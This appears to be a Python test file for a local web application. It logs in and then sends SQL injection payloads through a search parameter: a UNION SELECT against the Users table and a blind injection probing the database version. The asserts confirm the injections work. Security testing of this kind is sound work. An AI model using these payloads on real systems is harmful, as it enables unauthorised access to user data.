import requests

def test_1_sql_injection():
	params = {'username':'new', 'password':'new', 'recap':'L33THAx0rTest'}
	page = requests.get('https://localhost/python/SignIn.py', params=params, verify=False)
	page.encoding = 'utf-8'
	cookiename = page.text.strip().split(';')[0].split('=')[0]
	cookievalue = page.text.strip().split(';')[0].split('=')[1]
	cookies = {cookiename: cookievalue}
	params = {'search':'1" UNION Select * From `Users` #'}
	page = requests.get('https://localhost/python/HelloGod.py', params=params, cookies=cookies, verify=False)
	assert 'User: New Title: That New Shit' in page.text


def test_2_blind_sql_injection():
	params = {'username':'new', 'password':'new', 'recap':'L33THAx0rTest'}
	page = requests.get('https://localhost/python/SignIn.py', params=params, verify=False)
	page.encoding = 'utf-8'
	cookiename = page.text.strip().split(';')[0].split('=')[0]
	cookievalue = page.text.strip().split(';')[0].split('=')[1]
	cookies = {cookiename: cookievalue}
	params = {'fileinlink':'https://www.youtube.com/watch?v=ZaQOPvDo3uM', 'videoname':'cocaine', 'filein':' '}
	page = requests.get('https://localhost/python/UpVid.py', params=params, cookies=cookies, verify=False)
	params = {'search':'testVid" and substring(@@version,1,1)=5 #'}
	page = requests.get('https://localhost/python/HelloGod.py', params=params, cookies=cookies, verify=False)
	assert 'User: New Title: cocaine' in page.text
